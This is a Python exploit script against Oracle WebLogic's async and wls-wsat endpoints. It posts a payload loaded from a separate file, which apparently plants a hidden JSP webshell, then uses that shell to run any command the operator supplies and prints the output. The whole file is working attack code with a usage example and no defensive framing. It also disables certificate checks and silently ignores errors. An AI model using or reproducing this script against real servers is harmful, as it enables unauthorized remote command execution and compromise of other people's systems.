# -*- coding:utf-8 -*-
import requests
import time
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

with open('payload.txt','r') as f:
    PAYLOAD = f.read()

def get_webshell(url, cmd):
    webshell_name = '.s8Jn4gWlqX2c592.jsp'
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36','Content-Type':'text/xml;charset=UTF-8','fileName':webshell_name,'Content-Length':'239842','Connection':'close'}
    headers2 = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36'}
    try:
        ip_port = url.split('/')[2]
        if 'https' in url:
            url = 'https://' + ip_port + '/_async/AsyncResponseService'
            u2 = 'https://' + ip_port + '/wls-wsat/CoordinatorPortType'
        else:          
            url = 'http://' + ip_port + '/_async/AsyncResponseService'
            u2 = 'http://' + ip_port + '/wls-wsat/CoordinatorPortType'
        r0 = requests.get(url, headers=headers2,timeout = 10,verify=False)
        r2 = requests.get(u2, headers=headers2,timeout = 10,verify=False)
        if r0.status_code == 200 and 'WSDL' in r0.text:
            r1 = requests.post(url, headers=headers,data=PAYLOAD,timeout = 10,verify=False)
            if r1.status_code == 202:
                if 'https' in url:
                    shell_url = 'https://' + url.split('/')[2] + '/_async/' + webshell_name
                else:
                    shell_url = 'http://' + url.split('/')[2] + '/_async/' + webshell_name
                for i in range(10):
                    r2 = requests.get(shell_url, headers=headers2,timeout = 10,verify=False)
                    if r2.status_code == 200 and r2.headers['Content-Length'] == '17':
                        cookie = r2.headers['Set-Cookie']
                        if cookie:
                            cmd_url = f'{shell_url}?cmd={cmd}'
                            headers3 = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0','Cookie':cookie}
                            r3 = requests.get(cmd_url,headers=headers3,timeout=10,verify=False)
                            r3_text = r3.text
                            if '<pre>' in r3_text:
                                r3_text = r3_text.replace('<pre>','').replace('</pre>','').strip()
                                print(f'[+] Executing: {cmd_url}')
                                print(f'\n{r3_text}')
                            else:
                                print(shell_url)
                                print('Cookie:'+cookie)
                        else:
                            print(shell_url)   
                        break
                    time.sleep(2)
    except:
        pass

if __name__ == "__main__":
    h = "[!] Syntax error! Usage example: python3 exploit.py http://127.0.0.1:7003 'uname -a'" 
    if len(sys.argv) == 3:
        get_webshell(sys.argv[1], sys.argv[2])
    else:
        print(h)
        exit
